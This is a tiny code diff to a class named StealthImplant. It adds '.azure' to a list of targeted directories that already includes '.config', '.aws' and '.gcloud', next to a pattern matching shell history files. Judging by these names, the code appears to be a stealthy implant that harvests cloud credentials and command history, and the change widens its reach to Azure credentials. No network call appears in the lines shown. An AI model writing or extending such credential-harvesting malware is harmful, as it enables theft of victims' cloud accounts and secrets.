@@ -22,6 +22,7 @@ class StealthImplant:
             ".config", 
             ".aws", 
             ".gcloud",
+            ".azure",
         ],
         history_glob=".*_history",
         test=False
